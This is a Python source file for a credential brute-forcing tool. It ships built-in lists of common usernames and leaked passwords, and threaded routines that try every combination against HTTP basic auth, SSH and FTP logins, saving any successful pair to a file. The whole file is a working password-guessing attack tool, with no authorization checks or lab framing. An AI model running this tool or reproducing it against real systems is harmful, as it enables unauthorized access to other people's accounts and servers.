import requests, paramiko, ftplib, json, threading, os
from concurrent.futures import ThreadPoolExecutor, as_completed

# ====== Expanded user list (80+ entries it can add  or removed more by your self ) ======
USERS = [
    'admin','root','test','user','administrator',            # original
    'guest','support','manager','operator','supervisor',
    'info','webmaster','mysql','postgres','oracle',
    'sa','backup','deploy','jenkins','gitlab',
    'ci','monitoring','dev','developer','sysadmin',
    'netadmin','security','ftp','anonymous','nobody',
    'system','api','bot','cron','service',
    'adm','usr','mail','news','ssh',
    'docker','kubernetes','k8s','terraform','ansible',
    'vagrant','puppet','chef','splunk','elastic',
    'grafana','kibana','zabbix','nagios','cacti',
    'prometheus','alertmanager','hadoop','spark','hive',
    'airflow','superset','jupyter','rstudio','vscode',
    'web','www','app','application','demo',
    'tester','qa','staging','uat','preprod',
    'production','prod','live','old','archive',
    'git','svn','cvs','mercurial','bazaar',
    'vnc','rdp','xrdp','samba','smb',
    'ldap','kerberos','radius','tacacs','freeradius'
]

# ====== Expanded password list (200+ entries, modern and it can add  or removed more by your self ) ======
PASSWORDS = [
    'admin','password','123456','admin123','letmein','root','test',    # original
    # Top leaked 2024-2026 passwords
    '12345678','123456789','1234567890','qwerty','qwerty123',
    'abc123','picture1','password1','password123','iloveyou',
    'welcome','monkey','dragon','master','princess',
    'football','baseball','hockey','soccer','basketball',
    'sunshine','shadow','michael','ashley','charlie',
    'daniel','jessica','jennifer','amanda','andrew',
    'joshua','matthew','anthony','william','george',
    'hunter1','ranger','thomas','robert','richard',
    'chocolate','cheese','pepper','cookie','coffee',
    'letmein1','trustno1','pa55word','passw0rd','p@ssw0rd',
    'admin1','root123','toor','superuser','supervisor',
    'network','cisco','juniper','arista','brocade',
    'fortinet','paloalto','checkpoint','firewall','proxy',
    'database','oracle','sqlserver','db2','sybase',
    'informix','teradata','netezza','vertica','greenplum',
    'hadoop','spark','storm','flink','kafka',
    'zookeeper','ambari','cloudera','hortonworks','mapr',
    'sas','spss','stata','matlab','octave',
    'julia','python','ruby','perl','php',
    'nodejs','react','angular','vue','django',
    'flask','spring','express','meteor','ember',
    'backbone','bootstrap','foundation','skeleton','uikit',
    'materialize','pure','semantic','tailwind','bulma',
    'admin2','admin3','administrator1','administrator2',
    'sysadmin','netadmin','operator','engineer','tech',
    'support1','helpdesk','itsupport','itadmin','infra',
    'security1','secadmin','auditor','compliance','risk',
    'temp','temp123','test123','tester','qatest',
    'stage','devtest','testuser','demo','guest',
    'guest123','anonymous','anon','nobody','ftpuser',
    'sambauser','ldapuser','kerbuser','vncuser','xrdpuser',
    'root1234','toor1234','r00t','adm1n','pa$$word',
    'P@55w0rd!','S3cr3t!','Chang3Me!','Winter2024','Summer2025',
    'Spring2026','Autumn2025','January2026','February2026','March2026',
    'April2026','May2026','June2026','July2026','August2026',
    'September2026','October2026','November2026','December2026',
    'Qwerty1!','Asdfgh1!','Zxcvbn1!','Qazwsx1!','Plmokn1!',
    '123qwe','qwe123','zaq12wsx','xsw23edc','cde34rfv',
    'vfv45tgb','bgt56yhn','nhy67ujm','mju78ik','ki89ol',
    'lo90pl','pl01qa','aq12sw','sw23de','de34fr',
    'fr45gt','gt56hy','hy67ju','ju78ki','ki89lo',
    'lo90pl','pl01qa','aq12sw','sw23de','de34fr'
]

class BruteForcer:
    def __init__(self, target, threads=5, verbose=False, output_file=None,
                 userlist=None, passlist=None):
        self.target = target
        self.threads = threads
        self.verbose = verbose
        self.output = output_file or "brute.json"
        # Load custom wordlists if provided, else use built-in
        self.userlist = self._load_wordlist(userlist) if userlist else USERS
        self.passlist = self._load_wordlist(passlist) if passlist else PASSWORDS

    @staticmethod
    def _load_wordlist(filepath):
        """Read lines from file, ignoring comments and blanks."""
        if not filepath or not os.path.isfile(filepath):
            return []
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]

    def _write_result(self, protocol, user, pwd):
        with open(self.output, 'a') as f:
            f.write(f"{protocol} {user}:{pwd}\n")

    def http_brute(self, threaded=False):
        print("\n--- HTTP Brute Force ---")
        if threaded:
            self._http_brute_threaded()
        else:
            for user in self.userlist:
                for pwd in self.passlist:
                    try:
                        r = requests.get(self.target, auth=(user, pwd), timeout=5)
                        if r.status_code != 401:
                            print(f"  [+] HTTP success: {user}:{pwd}")
                            self._write_result("HTTP", user, pwd)
                    except: pass

    def _http_brute_threaded(self):
        def try_login(user, pwd):
            try:
                r = requests.get(self.target, auth=(user, pwd), timeout=5)
                if r.status_code != 401:
                    print(f"  [+] HTTP success: {user}:{pwd}")
                    self._write_result("HTTP", user, pwd)
                    return True
            except: pass
            return False

        combos = [(u, p) for u in self.userlist for p in self.passlist]
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(try_login, u, p): (u, p) for u, p in combos}
            for future in as_completed(futures):
                future.result()  # just to propagate exceptions

    def ssh_brute(self, threaded=False):
        print("\n--- SSH Brute Force ---")
        host = self.target
        if '@' in host:
            host = host.split('@')[1].split(':')[0]
        if threaded:
            self._ssh_brute_threaded(host)
        else:
            for user in self.userlist:
                for pwd in self.passlist:
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(host, username=user, password=pwd, timeout=5)
                        print(f"  [+] SSH success: {user}:{pwd}")
                        ssh.close()
                        self._write_result("SSH", user, pwd)
                    except: pass

    def _ssh_brute_threaded(self, host):
        def try_login(user, pwd):
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, username=user, password=pwd, timeout=5)
                print(f"  [+] SSH success: {user}:{pwd}")
                ssh.close()
                self._write_result("SSH", user, pwd)
                return True
            except: pass
            return False

        combos = [(u, p) for u in self.userlist for p in self.passlist]
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(try_login, u, p): (u, p) for u, p in combos}
            for future in as_completed(futures):
                future.result()

    def ftp_brute(self, threaded=False):
        print("\n--- FTP Brute Force ---")
        host = self.target
        if 'ftp.' in host:
            host = host.split('ftp.')[1].split('/')[0]
        if threaded:
            self._ftp_brute_threaded(host)
        else:
            for user in self.userlist:
                for pwd in self.passlist:
                    try:
                        ftp = ftplib.FTP(host, user, pwd, timeout=5)
                        print(f"  [+] FTP success: {user}:{pwd}")
                        ftp.quit()
                        self._write_result("FTP", user, pwd)
                    except: pass

    def _ftp_brute_threaded(self, host):
        def try_login(user, pwd):
            try:
                ftp = ftplib.FTP(host, user, pwd, timeout=5)
                print(f"  [+] FTP success: {user}:{pwd}")
                ftp.quit()
                self._write_result("FTP", user, pwd)
                return True
            except: pass
            return False

        combos = [(u, p) for u in self.userlist for p in self.passlist]
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(try_login, u, p): (u, p) for u, p in combos}
            for future in as_completed(futures):
                future.result()